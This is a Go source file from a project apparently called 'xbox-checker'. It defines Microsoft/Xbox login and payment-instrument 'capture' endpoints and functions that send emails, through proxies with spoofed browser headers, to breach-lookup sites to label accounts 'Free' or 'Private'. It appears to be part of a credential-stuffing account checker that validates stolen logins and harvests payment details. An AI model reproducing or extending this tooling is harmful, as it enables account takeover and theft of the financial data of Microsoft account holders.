// Package xbox holds the Microsoft/Xbox login flow, account classification
// and the full-capture validation entrypoint.
package xbox

import (
	"encoding/json"
	"fmt"
	http "github.com/bogdanfinn/fhttp"
	"io"
	"strings"
	"time"

	"xbox-checker/internal/nettls"
)

// Endpoint URLs for the Microsoft login and payment capture flow.
const (
	PreflightURL           = "https://login.live.com/oauth20_authorize.srf?redirect_uri=https://sisu.xboxlive.com/connect/oauth/XboxLive&response_type=code&client_id=000000004420578E&scope=XboxLive.Signin%20+XboxLive.offline_access&lw=1&fl=dob,easi2&xsup=1&nopa=2"
	LoginPostURL           = "https://login.live.com/ppsecure/post.srf?nopa=2&client_id=000000004420578E"
	OAuthAuthorizeURL      = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
	PaymentInstrumentsURL  = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
	PaymentTransactionsURL = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
)

func ClassifyAccountType(email, proxyStr string) string {
	email = strings.TrimSpace(email)
	if email == "" {
		return "Private"
	}
	first := classifyDatabreach(email, proxyStr)
	if strings.EqualFold(first, "Free") {
		return "Free"
	}
	// First API said private — confirm with Cybernews leak check.
	if classifyCybernews(email, proxyStr) == "Free" {
		return "Free"
	}
	return "Private"
}

func classifyDatabreach(email, proxyStr string) string {
	pii, _ := json.Marshal(email)
	payload := fmt.Sprintf(`{"file":"/app/rpc/search.telefunc.ts","name":"public_search","args":[{"piis":[{"type":"email","value":%s,"pii_id":"%d"}],"main_breach_id":"!undefined"}]}`, string(pii), time.Now().UnixMilli())
	cli := nettls.NewClient(proxyStr, 12*time.Second, true)
	if cli == nil {
		return "Private"
	}
	home, _ := http.NewRequest("GET", "https://databreach.com/", nil)
	home.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	if resp, err := nettls.Do(cli, home); err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
	req, err := http.NewRequest("POST", "https://databreach.com/_telefunc?_telefunc=txt", strings.NewReader(payload))
	if err != nil {
		return "Private"
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("Origin", "https://databreach.com")
	req.Header.Set("Referer", "https://databreach.com/")
	req.Header.Set("X-Telefunc-Request", "txt")
	req.Header.Set("Accept", "*/*")
	resp, err := nettls.Do(cli, req)
	if err != nil {
		return "Private"
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	var wrap struct {
		Ret struct {
			Results       []json.RawMessage `json:"results"`
			TotalBreaches int               `json:"totalBreaches"`
			Hidden        int               `json:"hiddenBreaches"`
		} `json:"ret"`
	}
	if json.Unmarshal(b, &wrap) != nil {
		return "Private"
	}
	if len(wrap.Ret.Results) > 0 || wrap.Ret.TotalBreaches > 0 || wrap.Ret.Hidden > 0 {
		return "Free"
	}
	return "Private"
}

func classifyCybernews(email, proxyStr string) string {
	cli := nettls.NewClient(proxyStr, 12*time.Second, true)
	if cli == nil {
		return "Private"
	}
	body, _ := json.Marshal(map[string]string{"email": email})
	req, err := http.NewRequest("POST", "https://data-leak-check.cybernews.com/chk/email", strings.NewReader(string(body)))
	if err != nil {
		return "Private"
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", "https://cybernews.com")
	req.Header.Set("Referer", "https://cybernews.com/")
	req.Header.Set("Accept", "*/*")
	resp, err := nettls.Do(cli, req)
	if err != nil {
		return "Private"
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	var wrap struct {
		DataLeakEmails []json.RawMessage `json:"dataLeakEmails"`
		Total          int               `json:"total"`
	}
	if json.Unmarshal(b, &wrap) != nil {
		return "Private"
	}
	if wrap.Total > 0 || len(wrap.DataLeakEmails) > 0 {
		return "Free"
	}
	return "Private"
}
